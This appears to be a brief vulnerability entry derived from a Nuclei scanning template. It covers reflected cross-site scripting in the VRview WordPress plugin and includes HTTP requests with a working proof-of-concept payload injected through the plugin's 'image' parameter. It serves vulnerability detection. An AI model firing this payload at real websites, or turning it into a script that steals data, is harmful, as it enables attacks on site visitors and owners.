# Vulnerability: VRview Plugin - Cross-Site Scripting
**Classification:** WP
**Source:** Nuclei Template (`vrview-xss.yaml`)

## Description
The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
Host: {{Hostname}}
```

